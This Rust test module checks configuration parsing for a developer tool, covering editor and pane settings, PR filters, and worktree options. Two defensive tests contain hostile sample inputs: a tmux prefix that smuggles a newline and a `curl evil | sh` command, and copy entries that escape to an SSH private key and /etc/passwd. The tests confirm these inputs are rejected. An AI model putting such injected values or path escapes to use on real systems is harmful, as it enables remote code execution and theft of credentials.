        let EditorConfig::Command(Some(command)) = config_from("").editor else {
            panic!("expected a command editor");
        };
        assert_eq!(argv(&command), ["zed", "-e"]);
    }

    #[test]
    fn an_empty_editor_command_edits_nothing() {
        assert_eq!(
            config_from("[editor]\ncommand = []").editor,
            EditorConfig::Command(None)
        );
    }

    #[test]
    fn editing_through_herdr_runs_nvim_unless_told_otherwise() {
        let EditorConfig::Herdr(command) = config_from("[editor]\nvia = \"herdr\"").editor else {
            panic!("expected a herdr editor");
        };
        assert_eq!(argv(&command), ["nvim"]);
    }

    #[test]
    fn editing_through_herdr_runs_the_configured_command() {
        let config = config_from("[editor]\nvia = \"herdr\"\ncommand = [\"hx\"]");
        let EditorConfig::Herdr(command) = config.editor else {
            panic!("expected a herdr editor");
        };
        assert_eq!(argv(&command), ["hx"]);
    }

    #[test]
    fn editing_through_herdr_with_no_command_is_refused() {
        // herdr runs the command in a new space; with nothing to run the
        // space would be an empty shell nobody asked for.
        let err = err_from("[editor]\nvia = \"herdr\"\ncommand = []");
        assert!(err.contains("editor.command"), "got: {err}");
    }

    #[test]
    fn an_unknown_via_names_the_field_and_the_choices() {
        let err = err_from("[open]\nvia = \"vim\"");
        assert!(err.contains("open.via"), "got: {err}");
        assert!(err.contains("command, herdr"), "got: {err}");
        let err = err_from("[editor]\nvia = \"\"");
        assert!(err.contains("editor.via"), "got: {err}");
    }

    #[test]
    fn an_editor_command_whose_program_is_blank_is_rejected() {
        let err = err_from("[editor]\ncommand = [\"  \"]");
        assert!(err.contains("editor.command"), "got: {err}");
        let err = err_from("[open]\ncommand = [\"  \"]");
        assert!(err.contains("open.command"), "got: {err}");
    }

    #[test]
    fn an_editor_command_with_no_open_table_is_noticed() {
        // `[editor] command` used to be what a worktree opened in. A config
        // written then would otherwise quietly start opening worktrees in Zed.
        let config = config_from("[editor]\ncommand = [\"code\"]");
        assert_eq!(config.notices.len(), 1, "{:?}", config.notices);
        assert!(config.notices[0].contains("[open]"), "{:?}", config.notices);
    }

    #[test]
    fn an_editor_command_beside_an_open_table_is_not_noticed() {
        let config = config_from("[editor]\ncommand = [\"code\"]\n[open]\nvia = \"herdr\"");
        assert!(config.notices.is_empty(), "{:?}", config.notices);
    }

    #[test]
    fn the_default_editor_command_written_out_is_not_noticed() {
        let config = config_from("[editor]\ncommand = [\"zed\", \"-e\"]");
        assert!(config.notices.is_empty(), "{:?}", config.notices);
    }

    #[test]
    fn an_unknown_open_key_is_an_error() {
        assert!(toml::from_str::<RawConfig>("[open]\neditor = \"zed\"").is_err());
    }

    #[test]
    fn an_absent_prs_table_filters_nothing() {
        assert_eq!(config_from("").prs, zax_domain::PrFilter::default());
    }

    #[test]
    fn the_prs_table_parses_into_a_filter() {
        let config = config_from(
            r#"
[prs]
include = ["acme/*", "gameldar/zax"]
exclude = ["acme/legacy-api"]
max_age = "14d"
"#,
        );
        assert_eq!(
            config
                .prs
                .include
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>(),
            ["acme/*", "gameldar/zax"]
        );
        assert_eq!(
            config
                .prs
                .exclude
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>(),
            ["acme/legacy-api"]
        );
        assert_eq!(config.prs.max_age, Some(Duration::from_secs(14 * 86_400)));
    }

    #[test]
    fn a_malformed_repository_filter_names_the_list_it_came_from() {
        let raw: RawConfig = toml::from_str("[prs]\ninclude = [\"omega\"]").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("prs.include"), "got: {err}");
        assert!(err.to_string().contains("omega"), "got: {err}");

        let raw: RawConfig = toml::from_str("[prs]\nexclude = [\"a/b*\"]").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("prs.exclude"), "got: {err}");
    }

    #[test]
    fn a_malformed_max_age_names_its_field() {
        let raw: RawConfig = toml::from_str("[prs]\nmax_age = \"a fortnight\"").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("prs.max_age"), "got: {err}");
    }

    #[test]
    fn the_spec_example_parses_into_domain_types() {
        let config = config_from(
            r#"
[agent]
command = ["claude"]

[[layout.panes]]
kind = "builtin"
name = "prs-for-review"
size = "30%"

[[layout.panes]]
kind = "exec"
title = "Deploys"
every = "60s"
command = ["kubectl", "get", "pods", "-n", "prod"]

[[layout.panes]]
kind = "raw"
command = ["lazygit"]

[worktree]
root  = "~/src/worktrees"
copy  = [".env", ".envrc"]
hooks = ["direnv allow", "bundle install"]
"#,
        );

        assert_eq!(config.layout.panes().len(), 3);
        assert_eq!(config.layout.panes()[0].size.map(|s| s.get()), Some(30));
        match &config.layout.panes()[1].kind {
            PaneKind::Exec {
                title,
                every,
                command,
            } => {
                assert_eq!(title, "Deploys");
                assert_eq!(*every, Duration::from_secs(60));
                assert_eq!(command.argv(), ["kubectl", "get", "pods", "-n", "prod"]);
            }
            other => panic!("expected an exec pane, got {other:?}"),
        }
        assert_eq!(
            config.worktree.root.as_path(),
            std::path::Path::new("/home/me/src/worktrees")
        );
        assert_eq!(
            config.worktree.copy,
            vec![PathBuf::from(".env"), PathBuf::from(".envrc")]
        );
        assert_eq!(
            config.worktree.hooks[1].argv(),
            ["sh", "-c", "bundle install"]
        );
    }

    #[test]
    fn a_pane_size_may_be_written_with_or_without_a_percent_sign() {
        let config = config_from(
            "[[layout.panes]]\nkind = \"builtin\"\nname = \"branch-status\"\nsize = \"25\"",
        );
        assert_eq!(config.layout.panes()[0].size.map(|s| s.get()), Some(25));
    }

    #[test]
    fn an_unknown_builtin_pane_name_is_rejected_with_the_valid_names() {
        let raw: RawConfig =
            toml::from_str("[[layout.panes]]\nkind = \"builtin\"\nname = \"worktrees\"").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("prs-for-review"), "got: {err}");
    }

    #[test]
    fn a_mistyped_pane_field_is_an_error_not_a_silent_default() {
        // This is why the pane table is flat. As an internally tagged enum,
        // serde accepted `siz` and the pane quietly took a default size, in the
        // one table people hand-edit most.
        let err = toml::from_str::<RawConfig>(
            "[[layout.panes]]\nkind = \"builtin\"\nname = \"prs-for-review\"\nsiz = \"30%\"",
        )
        .unwrap_err();
        assert!(err.to_string().contains("siz"), "got: {err}");
    }

    #[test]
    fn an_unrelated_key_in_a_pane_table_is_an_error() {
        let err = toml::from_str::<RawConfig>(
            "[[layout.panes]]\nkind = \"raw\"\ncommand = [\"lazygit\"]\nnonsense = 1",
        )
        .unwrap_err();
        assert!(err.to_string().contains("nonsense"), "got: {err}");
    }

    #[test]
    fn a_pane_carrying_a_field_its_kind_does_not_use_is_rejected() {
        let raw: RawConfig = toml::from_str(
            "[[layout.panes]]\nkind = \"builtin\"\nname = \"prs-for-review\"\n\
             command = [\"lazygit\"]",
        )
        .unwrap();
        assert!(matches!(
            from_raw(raw, "/home/me"),
            Err(ConfigError::UnexpectedPaneField {
                kind: "builtin",
                field: "command"
            })
        ));
    }

    #[test]
    fn a_pane_missing_a_field_its_kind_needs_is_rejected() {
        let raw: RawConfig = toml::from_str(
            "[[layout.panes]]\nkind = \"exec\"\ntitle = \"Deploys\"\ncommand = [\"true\"]",
        )
        .unwrap();
        assert!(matches!(
            from_raw(raw, "/home/me"),
            Err(ConfigError::MissingPaneField {
                kind: "exec",
                field: "every"
            })
        ));
    }

    #[test]
    fn an_unknown_pane_kind_lists_the_kinds_that_exist() {
        let raw: RawConfig =
            toml::from_str("[[layout.panes]]\nkind = \"buitin\"\nname = \"x\"").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(
            err.to_string().contains("builtin, exec or raw"),
            "got: {err}"
        );
    }

    #[test]
    fn a_malformed_refresh_interval_is_rejected() {
        let raw: RawConfig = toml::from_str(
            "[[layout.panes]]\nkind = \"exec\"\ntitle = \"T\"\nevery = \"soon\"\n\
             command = [\"true\"]",
        )
        .unwrap();
        assert!(from_raw(raw, "/home/me").is_err());
    }

    #[test]
    fn an_empty_pane_command_is_rejected() {
        let raw: RawConfig =
            toml::from_str("[[layout.panes]]\nkind = \"raw\"\ncommand = []").unwrap();
        assert!(from_raw(raw, "/home/me").is_err());
    }

    #[test]
    fn the_default_panes_stack_into_the_intended_column_geometry() {
        // The sizes are relative, so what they are worth is only visible after
        // walking the split chain: pane 1 splits the agent, and every later
        // pane splits its predecessor, taking that share of it. These numbers
        // are chosen for the result, so the result is what is asserted.
        let config = config_from("");
        let sizes: Vec<f64> = config
            .layout
            .panes()
            .iter()
            .map(|p| f64::from(p.size.unwrap().get()))
            .collect();

        // Pane 1's size is a width share of the window; the agent keeps the rest.
        assert_eq!(sizes[0], 30.0, "the context column's width");

        // Heights, as shares of that column. Each split hands the new pane its
        // percentage of the predecessor and leaves the predecessor the rest.
        let mut remaining = 100.0;
        let mut heights = Vec::new();
        for size in &sizes[1..] {
            let taken = remaining * size / 100.0;
            heights.push(remaining - taken);
            remaining = taken;
        }
        heights.push(remaining);

        let near = |got: f64, want: f64, what: &str| {
            assert!(
                (got - want).abs() < 2.0,
                "{what}: wanted about {want}%, got {got:.1}%"
            );
        };
        near(heights[0], 45.0, "prs-for-review");
        near(heights[1], 20.0, "branch-status");
        near(heights[2], 35.0, "my-prs");

        let total: f64 = heights.iter().sum();
        near(total, 100.0, "the column is fully used");
    }

    #[test]
    fn pane_sizes_past_one_hundred_percent_together_are_accepted() {
        // Each size is a share of the pane it splits, so sizes that add up to
        // more than 100% are how an even stack is written, not an error.
        let raw: RawConfig = toml::from_str(
            "[[layout.panes]]\nkind = \"builtin\"\nname = \"prs-for-review\"\nsize = \"60%\"\n\n\
             [[layout.panes]]\nkind = \"builtin\"\nname = \"branch-status\"\nsize = \"45%\"",
        )
        .unwrap();
        let config = from_raw(raw, "/home/me").unwrap();
        assert_eq!(config.layout.panes().len(), 2);
    }

    #[test]
    fn a_tmux_prefix_may_not_carry_a_newline_into_the_generated_conf() {
        // The prefix is substituted into zax's tmux.conf as text, so a newline
        // writes further configuration lines of the repository's choosing.
        let raw: RawConfig =
            toml::from_str("[tmux]\nprefix = \"C-a\\nrun-shell 'curl evil | sh'\"").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("tmux.prefix"), "got: {err}");
    }

    #[test]
    fn an_ordinary_prefix_is_still_accepted() {
        assert_eq!(config_from("[tmux]\nprefix = \"C-q\"").tmux.prefix, "C-q");
    }

    #[test]
    fn a_copy_entry_may_not_escape_the_repository_or_the_worktree() {
        // Every entry is joined onto both the source repo and the new worktree;
        // `..` escapes both, and an absolute path replaces both bases.
        for entry in ["../../.ssh/id_ed25519", "/etc/passwd", ""] {
            let raw: RawConfig =
                toml::from_str(&format!("[worktree]\ncopy = [\"{entry}\"]")).unwrap();
            let err = from_raw(raw, "/home/me").unwrap_err();
            assert!(
                err.to_string().contains("worktree.copy"),
                "`{entry}` must be rejected, got: {err}"
            );
        }
    }

    #[test]
    fn ordinary_copy_entries_are_still_accepted() {
        let config = config_from("[worktree]\ncopy = [\".env\", \"config/local.yml\"]");
        assert_eq!(
            config.worktree.copy,
            vec![PathBuf::from(".env"), PathBuf::from("config/local.yml")]
        );
    }

    #[test]
    fn a_relative_worktree_root_is_rejected() {
        let raw: RawConfig = toml::from_str("[worktree]\nroot = \"worktrees\"").unwrap();
        assert!(from_raw(raw, "/home/me").is_err());
    }

    #[test]
    fn no_projects_table_turns_the_feature_off() {
        assert_eq!(config_from("").projects, None);
    }

    #[test]
    fn a_projects_root_expands_home() {
        let config = config_from("[projects]\nroot = \"~/src\"");
        assert_eq!(
            config.projects.unwrap().root.as_path(),
            std::path::Path::new("/home/me/src")
        );
    }

    #[test]
    fn projects_paths_parse_into_slug_keyed_overrides() {
        let config = config_from(
            "[projects]\nroot = \"~/src\"\n\n[projects.paths]\n\"gameldar/zed-ai-extensions\" = \"~/src/tools/zed-ai-extensions\"\n",
        );
        let projects = config.projects.unwrap();
        let slug = zax_domain::RepoSlug::parse("gameldar/zed-ai-extensions").unwrap();
        assert_eq!(
            projects.paths.get(&slug),
            Some(std::path::Path::new("/home/me/src/tools/zed-ai-extensions"))
        );
    }

    #[test]
    fn a_projects_path_key_that_is_not_owner_name_names_the_field() {
        let err = err_from("[projects]\nroot = \"~/src\"\n\n[projects.paths]\nnorth = \"/x\"\n");
        assert!(err.contains("projects.paths"), "got: {err}");
    }

    #[test]
    fn projects_paths_without_a_root_is_refused() {
        let err =
            err_from("[projects.paths]\n\"gameldar/zed-ai-extensions\" = \"/h/src/tools/z\"\n");
        assert!(err.contains("projects.root"), "got: {err}");
    }

    #[test]
    fn a_relative_projects_root_is_refused() {
        let err = err_from("[projects]\nroot = \"src\"");
        assert!(err.contains("projects.root"), "got: {err}");
    }

    #[test]
    fn an_unknown_projects_key_is_an_error() {
        let err = toml::from_str::<RawConfig>("[projects]\nroots = \"/x\"").unwrap_err();
        assert!(err.to_string().contains("roots"), "got: {err}");
    }
}
